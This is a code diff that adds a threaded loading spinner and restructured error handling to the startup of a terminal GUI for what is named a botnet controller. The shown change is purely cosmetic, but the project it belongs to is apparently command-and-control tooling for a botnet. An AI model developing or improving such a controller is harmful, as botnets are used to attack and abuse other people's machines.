@@ -1,4 +1,5 @@
 
+import threading
 from botnetController import BotnetController, CommandRoom
 from rich.console import Console
 from rich.table import Table
@@ -7,6 +8,7 @@ from rich.panel import Panel
 from rich.align import Align
 from rich.live import Live
 import pyfiglet  
+import time
 
 class BotnetGUI:
     def __init__(self, controller: BotnetController):
@@ -240,10 +242,34 @@ class BotnetGUI:
     
     def run(self):
         try:
-            self.controller.run()
-            self.main_menu()
+            self.console.clear()
+            self.print_ascii_title()
+            
+            is_loading = True
+            def spinner():
+                spinner_chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+                console = Console()
+                with Live("", console=console, transient=True, refresh_per_second=10) as live:
+                    i = 0
+                    while is_loading:
+                        spin_char = spinner_chars[i % len(spinner_chars)]
+                        live.update(f"{spin_char} [bold yellow]Initializing Botnet Controller...[/]")
+                        time.sleep(0.15)
+                        i += 1
+            spinner_thread = threading.Thread(target=spinner)
+            spinner_thread.start()
+            
+            try:
+                self.controller.run()
+                is_loading = False
+                spinner_thread.join()
+                self.main_menu()
+            except Exception as e:
+                is_loading = False
+                spinner_thread.join()
+                self.console.print(f"[bold red]Error during startup:[/] {str(e)}")
         except Exception as e:
-            self.console.print(f"[bold red]Error during startup:[/] {str(e)}")
+            self.console.print(f"[bold red]Unexpected error:[/] {str(e)}")
 
 if __name__ == "__main__":
     gui = BotnetGUI(BotnetController())
